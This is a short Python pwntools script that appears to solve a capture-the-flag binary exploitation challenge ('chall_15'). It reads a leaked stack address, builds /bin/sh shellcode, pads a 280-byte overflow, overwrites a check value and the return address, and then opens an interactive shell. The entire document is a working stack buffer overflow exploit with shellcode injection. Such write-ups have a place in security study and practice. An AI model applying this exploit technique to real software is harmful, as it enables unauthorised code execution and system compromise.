from pwn import *

comb_args = 0xb16b00b5deadd00d

p = process('./chall_15')

p.recvuntil(b'baked beans\n')
leak = int(p.recvline().decode('utf-8').strip(), 16)

context.arch = 'amd64'
shellcode = asm(shellcraft.sh())

payload = shellcode + (280 - len(shellcode))*b'A' + p64(comb_args) + 8*b'A' + p64(leak)

p.sendline(payload)
p.interactive()
